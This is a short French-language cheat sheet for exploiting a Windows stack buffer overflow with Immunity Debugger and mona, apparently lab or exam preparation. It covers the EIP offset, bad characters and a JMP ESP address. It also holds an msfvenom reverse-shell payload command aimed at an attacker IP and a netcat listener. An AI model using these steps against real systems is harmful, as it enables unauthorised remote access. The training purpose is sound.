# Mona with Immunity Debugger

- Fuzzer le binaire pour trouver le nombre caractere qui fait planter le programme.

Demarrer le serveur (Running) dans immunity et crée un nouveau workspace:

```sh
!mona config -set workingfolder c:\mona\%p
```

Créer un pattern avec metasploit pour trouver l'offset d'EIP

```sh
msf-pattern_create -l 2400 
# 2400 (qui le resultat du script fuzzing.py)
```

Retrouve l'offset exacte d'EIP au moment du crash

```sh
!mona findmsp -distance 2400
# ou 
msf-pattern_offset -q EIP_ADDRESS
```

Remarrer le serveur (Running) dans immunity et recherche les badchars, on créer un tableau de badchars avec mona

```sh
!mona bytearray -b "\x00"
```

On génère une chaîne de badchars qu'on ajoute en tant que payload dans le script d'exploit ET on l'execute.

On compare les badchars avec l'offset d'ESP au moment du crash pour retourver les badchars

```sh
!mona compare -f C:\mona\<workingfolder>\bytearray.bin -a <ESP offset>
```

On génére un shellcode avec metasploit excluant les badchars

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 -b "<badchars>" -f py
```

Remarrer le serveur (Running) dans immunity et trouver un offset de jump sur ESP avec mona pour exécuter le shellcode.

```sh
!mona jmp -r esp -cpb "<badchars>"
```

On met à jour l'offset du retn dans le script d'exploit et on ajoute des NOPS (16 c'est pas mal)

On démarre un netcat en local et on exploite

```sh
rlwrap nc -nlvp 4444
```